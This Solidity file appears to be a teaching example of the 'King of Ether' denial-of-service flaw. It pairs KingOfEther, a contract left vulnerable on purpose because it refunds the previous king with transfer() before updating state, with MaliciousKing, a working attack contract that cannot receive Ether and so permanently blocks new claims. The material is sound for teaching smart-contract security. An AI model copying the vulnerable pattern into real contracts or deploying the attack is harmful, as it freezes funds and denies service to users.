// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

/**
 * @title KingOfEther
 * @dev A contract where users can claim the throne by paying more than the current king
 * Vulnerable to DoS attacks if the current king refuses to accept Ether
 */
contract KingOfEther {
    address public king;
    uint public balance;

    /**
     * @dev Allows a user to claim the throne by paying more than the current balance
     * The previous king gets their funds back
     * @notice This function is vulnerable to DoS attacks if the current king can't receive Ether
     */
    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");
        
        // This transfer will fail if the king address can't receive Ether
        // causing the entire transaction to revert
        payable(king).transfer(balance);
        
        balance = msg.value;
        king = msg.sender;
    }
}

/**
 * @title MaliciousKing
 * @dev A contract designed to attack the KingOfEther contract
 * Once this contract becomes king, no one else can claim the throne
 */
contract MaliciousKing {    
    /**
     * @dev Attacks the KingOfEther contract by becoming king
     * @param kingOfEther The address of the KingOfEther contract
     */
    function attack(KingOfEther kingOfEther) external payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
    
    // No receive or fallback function implemented
    // This means the contract can't receive Ether
    // Any attempt to send Ether to this contract will fail
    // Once this contract becomes king, the KingOfEther.claimThrone function
    // will always revert when trying to pay back this contract
}